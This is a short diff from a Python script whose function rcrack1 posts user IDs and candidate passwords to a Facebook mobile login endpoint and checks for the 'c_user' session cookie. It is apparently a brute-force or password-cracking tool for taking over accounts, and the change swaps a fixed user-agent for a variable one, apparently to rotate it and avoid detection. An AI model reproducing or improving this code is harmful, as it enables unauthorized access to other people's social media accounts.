@@ -241,8 +241,7 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            'viewport-width': '980',}
+            'user-agent': pro}
             lo = session.post('https://m.alpha.facebook.com/method/auth.login',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
